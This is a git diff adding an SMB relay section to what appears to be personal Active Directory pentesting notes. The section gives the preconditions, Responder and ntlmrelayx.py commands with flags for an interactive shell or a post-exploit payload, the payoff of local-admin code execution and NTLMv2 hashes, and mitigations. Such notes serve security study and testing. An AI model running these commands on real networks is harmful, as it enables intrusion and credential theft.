@@ -42,11 +42,31 @@ C:\windows\SYSVOL  → groups policy
 ![alt text](img/remote.png "remote resolution")
 
 ## smbrelay attack
-### idea
+### attack vector
+  smb signing enable but not require
+  pssed `NTLMv2` must be at least local admin
 ### tools
+respnder
+ntlmrelayx.py from impacket lib
 ### reproduce
-### metigation
+responder -I eth0 -rwdv `disable smb and http from /etc/respnder/Responder.conf`
+python /usr/share/doc/python-impacket/examples/ntlmrelayx.py -tf target.txt -smb2support  -i
+>-tf         target file
+-smb2support force ntlmrelay to use smbv2
+-i           get interactive shell
+-e           payload to run after exploit
+-c           command
 
+[logo]: img/responder.png
+![alt text](img/responder.png "hashes dumped")
+### payoff
+we get rce as local administartor
+we get local user `NTLMv2` hashes
+### metigation
+Enable smb siging on all devices
+Disable NTLM auth and move to kerberos
+Account tiering
+local admin restriction
 ---
 ## smbrelay attack
 ### idea
